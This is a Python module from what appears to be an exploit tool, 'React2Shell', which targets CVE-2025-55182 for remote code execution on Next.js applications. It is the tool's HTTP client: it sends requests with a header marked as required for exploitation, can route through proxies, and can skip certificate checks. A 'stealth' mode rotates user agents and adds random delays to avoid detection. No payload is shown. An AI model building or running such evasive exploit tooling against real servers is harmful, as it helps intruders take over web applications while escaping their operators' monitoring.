"""
React2Shell - CVE-2025-55182 PoC Tool
Developed by @BlackTechX011

Exploits prototype pollution in React Flight Protocol deserialization
to achieve Remote Code Execution on vulnerable Next.js applications.
"""
import requests
import random
import time
from typing import Optional, Dict, Tuple
from react2shell.utils.config import Config
from react2shell.ui.console import console

# Common User Agents for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
]

class HTTPClient:
    def __init__(self, config: Config):
        self.config = config
        self.session = requests.Session()
        self.session.verify = not config.insecure
        
        # Suppress SSL warnings
        if config.insecure:
            requests.packages.urllib3.disable_warnings()
            
        # Set proxy if provided
        if config.proxy:
            self.session.proxies = {
                "http": config.proxy,
                "https": config.proxy
            }
            
    def _get_headers(self) -> Dict[str, str]:
        headers = {
            "User-Agent": random.choice(USER_AGENTS) if self.config.stealth else USER_AGENTS[0],
            "Next-Action": "x" # Required for exploitation
        }
        
        # Add custom headers
        for h in self.config.headers:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()
                
        return headers

    def send(self, url: str, method: str = "POST", data: str = None, ContentType: str = None) -> Tuple[Optional[requests.Response], Optional[str]]:
        """
        Send a request with configured settings (timeout, proxies, headers).
        """
        
        # Stealth delay
        if self.config.stealth:
            time.sleep(random.uniform(0.5, 2.0))
            
        headers = self._get_headers()
        if ContentType:
            headers["Content-Type"] = ContentType

        try:
            resp = self.session.request(
                method=method,
                url=url,
                data=data,
                headers=headers,
                timeout=self.config.timeout,
                allow_redirects=False # We handle redirects manually if needed, or let scanner handle it
            )
            return resp, None
        except requests.exceptions.RequestException as e:
            return None, str(e)
